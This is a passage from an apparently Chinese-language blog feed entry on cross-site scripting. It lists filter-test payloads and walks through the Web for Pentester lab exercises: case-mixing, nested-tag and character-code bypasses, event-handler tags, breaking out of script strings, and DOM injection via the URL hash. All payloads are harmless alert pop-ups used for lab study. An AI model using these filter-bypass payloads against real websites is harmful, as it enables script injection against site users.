background=&quot;javascript:confirm(1)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&lt;a href=&quot;javascript:confirm(1)&quot;&gt;a&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javascrip&amp;#116&amp;#58confirm(1)&quot;&gt;a&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="过滤测试"><a href="#过滤测试" class="headerlink" title="过滤测试"></a>过滤测试</h3><p><strong>payload - 0</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zxcv%20script&lt;&gt;&quot;%27</span><br></pre></td></tr></table></figure><p><strong>payload - 1</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 2</strong></p><p>观察是否存在大小写混淆绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCript&gt;alert(1);&lt;/scRipt&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 3</strong></p><p>递归构造法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pent&lt;&lt;est&lt;script&gt;erL&gt;ab&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 4</strong></p><p>递归构造法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1);&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 5</strong></p><p>查看代码部分的关键词是否被限制了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert</span><br></pre></td></tr></table></figure><p><strong>payload - 6</strong></p><p>测试img标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=prompt(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 7</strong></p><p>测试div标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div onmouseover=alert(1)&gt;1&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="基本混淆"><a href="#基本混淆" class="headerlink" title="基本混淆"></a>基本混淆</h3><p>大小写混合</p><p>宽字节</p><h2 id="XSS靶场"><a href="#XSS靶场" class="headerlink" title="XSS靶场"></a>XSS靶场</h2><h3 id="web-for-pentester"><a href="#web-for-pentester" class="headerlink" title="web for pentester"></a>web for pentester</h3><p><strong>官网：</strong><a href="https://pentesterlab.com/">https://pentesterlab.com/</a></p><p><strong>下载地址</strong>：<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso">https://isos.pentesterlab.com/web_for_pentester_i386.iso</a></p><p><strong>安装方法</strong>：通过虚拟机挂载iso运行，该靶场环境是封装在<code>debian</code>系统里面的，运行在时候直接以<code>Live</code>方式运行，然后<code>ifconfig</code>查看下ip地址，在浏览器输入IP地址即可。</p><p><img src="/post/46185/penter.png"></p><h4 id="Example-1-–-无任何过滤"><a href="#Example-1-–-无任何过滤" class="headerlink" title="Example 1 – 无任何过滤"></a>Example 1 – 无任何过滤</h4><p><img src="/post/46185/e1.png"></p><p><strong>测试</strong></p><p><code>name=xss</code>、<code>name=&lt;h1&gt;xss&lt;/h1&gt;</code>观察页面，并查看源代码，发现输出是在标签外，则不需要闭合标签。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example1.php?name=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/post/46185/e12.png"></p><h4 id="Example-2-–-大小写绕过"><a href="#Example-2-–-大小写绕过" class="headerlink" title="Example 2 – 大小写绕过"></a>Example 2 – 大小写绕过</h4><p><strong>思路</strong></p><ol><li><p>和Example 1一样，先随便输入一下数据测试，通过观察结果，可以判断name参数的注入点没有过滤尖括号<code>&lt;&gt;</code>。</p></li><li><p>用基本语句测试 <code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，发现页面中只剩下的<code>alert(&quot;xss&quot;)</code>，<code>&lt;script&gt;&lt;/script&gt;</code>被过滤了，那么就需要绕过过滤。</p></li><li><p>尝试大小写转换，输入<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，发现页面中前一个<code>&lt;Script&gt;</code>没有被过滤，只有后一个<code>&lt;/script&gt;</code>被过滤了</p><p><img src="/post/46185/e2.png"></p><p>那么大小写是可以绕过过滤的，输入：<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/Script&gt;</code></p></li></ol><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example2.php?name=&lt;Script&gt;alert(&quot;xss&quot;)&lt;/Script&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-3-–-嵌套绕过"><a href="#Example-3-–-嵌套绕过" class="headerlink" title="Example 3 – 嵌套绕过"></a>Example 3 – 嵌套绕过</h4><p><strong>思路</strong></p><ol><li>经过上面的测试，没有过滤<code>alert(&#39;xss&#39;)</code>,现在就把注意力集中在 <code>&lt;script&gt;</code> 和<code>&lt;/script&gt;</code>上</li><li>使用过滤测试Example 2 payload探测。观察到结果中有一部分尖括号被过滤，但也有部分尖括号未被过滤。</li><li>构造payload</li></ol><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">example3.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1);&lt;/sc&lt;/script&gt;ript&gt;</span><br><span class="line">或</span><br><span class="line">example3.php?name=&lt;script &gt;alert(1)&lt;/script &gt;</span><br></pre></td></tr></table></figure><h4 id="Example-4-–-script直接被过滤，用其他标签"><a href="#Example-4-–-script直接被过滤，用其他标签" class="headerlink" title="Example 4 – script直接被过滤，用其他标签"></a>Example 4 – script直接被过滤，用其他标签</h4><p><strong>思路</strong></p><p><code>script</code>这个关键词被禁用。考虑用其他标签触发<code>XSS</code>。最常用的还是<code>img</code>标签。<br>除了<code>img</code>标签以外，还可以考虑<code>a</code>标签和<code>div</code>标签等。</p><p>触发函数有 <code>onerror</code>, <code>onmouseover</code>, <code>onmouseout</code>, <code>onmousemove</code>, <code>onclick</code>。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;img src=1 onerror=&#x27;alert(1)&#x27;&gt;</span><br><span class="line">&lt;img src=1 onerror=&#x27;alert(1)&#x27; /&gt;</span><br><span class="line">&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(1)&#x27; /&gt;</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27; /&gt;</span><br><span class="line">&lt;img src=1 onmouseover=alert(1)&gt;</span><br><span class="line">&lt;a href=1 onmouseover=alert(1)&gt;1&lt;/a&gt;</span><br><span class="line">&lt;div onclick=alert(1)&gt;1&lt;/div&gt;</span><br><span class="line">&lt;div onmouseover=alert(1)&gt;1&lt;/div&gt;</span><br><span class="line">&lt;img src=1 onmouseover=prompt(1)&gt;</span><br><span class="line">&lt;img src=1 onmouseover=confirm(1)&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-5-–-String-fromCharCode编码绕过"><a href="#Example-5-–-String-fromCharCode编码绕过" class="headerlink" title="Example 5 – String.fromCharCode编码绕过"></a>Example 5 – String.fromCharCode编码绕过</h4><p><strong>思路</strong></p><p><code>alert</code>被限制的情况。</p><p>绕过思路1,不使用<code>alert</code>而用其他的类似函数,比如<code>confirm</code>和<code>prompt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>绕过思路2,编码函数名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-6-–-—–标签内-闭合标签"><a href="#Example-6-–-—–标签内-闭合标签" class="headerlink" title="Example 6 – —–标签内,闭合标签"></a>Example 6 – <script></script>—–标签内,闭合标签</h4><p>直接注入JavaScript代码中。<br>不闭合<code>script</code>标签的情况，可以考虑用<code>//</code>注释后面的代码</p><p>在一个<code>script</code>的标签内，先实现闭合<code>&quot;;alert(1)//,&quot;</code>;用来闭合前面，<code>//</code>注释后面。将<code>hello，hacker</code>的地方写一个<code>alert(1)</code>即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(1)//</span><br><span class="line">&quot;;alert(1);var a=&quot;</span><br></pre></td></tr></table></figure><p>顺带再闭合一下<code>script</code>标签也不是不可以，只是有点多此一举。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&lt;/script&gt;&lt;script&gt;alert(1)//</span><br><span class="line">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-7-–-标签内—–闭合标签"><a href="#Example-7-–-标签内—–闭合标签" class="headerlink" title="Example 7 – 标签内—–闭合标签"></a>Example 7 – <script></script>标签内—–闭合标签</h4><p>左右尖括号和双引号<code>&lt;,&gt;,&quot;</code>被HTML encoding。<br>如上个例子所述，其实并不需要用到尖括号，并且可以用单引号分割。<br>(用双引号还是单引号分割得看目标页面的代码怎么写，类似于python)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(1)//</span><br></pre></td></tr></table></figure><h4 id="Example-8-–-有过滤，表单"><a href="#Example-8-–-有过滤，表单" class="headerlink" title="Example 8 – 有过滤，表单"></a>Example 8 – 有过滤，表单</h4><p>对尖括号进行的过滤，转义；<br>有一个表单：输入<code>xxxx</code>点击提交，查看源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HELLO xxxxx&lt;form action=&quot;/xss/example8.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</span><br></pre></td></tr></table></figure><p>尖括号无法绕过，然后发现表单的url可以被重置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xss/example8.php//%22%20onsubmit=%22alert(&#x27;1&#x27;)</span><br></pre></td></tr></table></figure><p>然后点击提交，会触发弹窗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/xss/example8.php/&quot; onsubmit=&quot;alert(&#x27;1&#x27;)&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-9-–-直接在-后面添加alert-1"><a href="#Example-9-–-直接在-后面添加alert-1" class="headerlink" title="Example 9 – 直接在#后面添加alert(1)"></a>Example 9 – 直接在#后面添加alert(1)</h4><p>DOM型 XSS 的典型代表，恶意输入并没有直接反映在返回的HTML中，而要依赖浏览器动态执行JavaScript之后，恶意输入才能被执行。</p><p>把URL改成<code>http://192.168.150.157/xss/example9.php#alert(1)</code><br>首先看到代码里有<code> document.write(location.hash.substring(1));&lt;/script&gt;</code>，所以显然入口在这里。<br><code>document.write()</code>是把括号中的内容写到<code>HTML</code>文档中，<code>location.hash</code>就是得到<code>URL</code>中<code>#</code>开始的字符串，<code>substring(1)</code>就得到了<code>#</code>后的字符串。<br>所以就在#后加入payload：<code>#alert(1)</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;h3 id=&quot;什么是XSS&quot;&gt;&lt;a href=&quot;#什么是XSS&quot; class=&quot;headerlink&quot; title=&quot;什么是XSS&quot;&gt;&lt;/a&gt;什</summary>
      
    
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/categories/WEB/"/>
    
    
    <category term="XSS" scheme="http://lvpsectime.github.io/tags/XSS/"/>
    
  </entry>
  
</feed>
